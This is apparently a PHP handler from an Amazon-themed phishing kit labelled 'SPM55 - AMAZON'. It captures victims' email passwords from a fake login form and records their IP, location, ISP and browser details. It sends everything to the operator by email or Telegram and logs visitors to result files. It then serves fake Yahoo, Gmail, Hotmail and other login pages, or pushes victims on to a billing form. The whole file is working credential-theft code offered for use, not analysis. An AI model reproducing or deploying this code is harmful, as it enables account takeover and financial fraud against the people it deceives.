<?php
session_start();
require_once('../main.php');
$_SESSION['email'] = $_POST['email'];
$email = explode("@",$_SESSION['email']);

if (isset($_POST['password'])) {
		$subject = "EMAIL LOGIN 1 [".$_POST['email']."] - [".$cn." - ".$ip." - ".$br."]";
		$message = '
		===============[ EMAIL LOGIN ]===============<br>
		Email : '.$_POST['email'].'<br>
		Password : '.$_POST['password'].'<br>
		===============[ DEVICE INFORMATION ]===============<br>
		Country : '.$cn.'<br>
		Region : '.$regioncity.'<br>
		City : '.$citykota.'<br>
		Continent : '.$continent.'<br>
		Useragent : '.$user_agent.'<br>
		ISP : '.$ispuser.'<br>
		IP : '.$ip.'<br>
		OS / Browser : '.$os.' / '.$br.'<br>
		Timezone : '.$timezone.'<br>
		Date : '.$date.'<br>
		===============[ SPM55 - AMAZON ]===============
		';
		$headers  = 'MIME-Version: 1.0' . "\r\n";
		$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
		$headers .= 'FROM: EMAIL LOGIN 1 <'.$sender_mail.'>' . "\r\n";
		api($message,$subject,"email");
	if ($send_login == "email") {
		mail($email_result, $subject, $message, $headers);
		tulis_file("../result/email.txt", $ip);
		tulis_file("../result/visitor.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|EMAIL LOGIN 1");
	}else{
		$message = 'message========[ EMAIL LOGIN 1 ]=======|Email : '.$_POST['email'].'|Password : '.$_POST['password'].'|=======[ DEVICE INFORMATION ]=======|Country : '.$cn.'|Region : '.$regioncity.'|City : '.$city.'|User Agent : '.$user_agent.'|OS / BR : '.$os.' / '.$br.'|ISP : '.$ispuser.'|IP : '.$ip.'|Timezone : '.$timezone.'|=======[ SPM55 - AMAZON ]=======';
		send_telegram($set_ip,$domain,$message);
		tulis_file("../result/email.txt", $ip);
		tulis_file("../result/visitor.txt", "".$cn."|".$os."|".$br."|".$ip."|".$date."|EMAIL LOGIN 1");
	}
}

if(preg_match('/yahoo/', $email[1]) or preg_match('/ymail/', $email[1])) {
	require_once("../files/login-yahoo.php");
}else if(preg_match('/aol/', $email[1])) {
	require_once("../files/login-aol.php");
}else if(preg_match('/gmail/', $email[1])) {
	require_once("../files/login-gmail.php");
}else if(preg_match('/comcast/', $email[1])) {
	require_once("../files/login-comcast.php");
}else if(preg_match('/hotmail/', $email[1]) or preg_match('/live/', $email[1]) or preg_match('/outlook/', $email[1]) or preg_match('/msn/', $email[1]) or preg_match('/passport/', $email[1])) {
	require_once("../files/login-hotmail.php");
}else if(preg_match('/gmx/', $email[1])) {
	require_once("../files/login-gmx.php");
}else if(preg_match('/web/', $email[1])) {
	require_once("../files/login-web.php");
}else{
	echo "<script>alert('Sorry your email is not connected to Amazon.');</script>";
	echo "<form id='boyxd' method='POST' action='../billing'><input type='hidden' name='email' value='".$_POST['email']."'><input type='hidden' name='pass_log' value='".$_POST['pass_log']."'><input type='hidden' name='password' value='".$_POST['pass_log']."'></form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}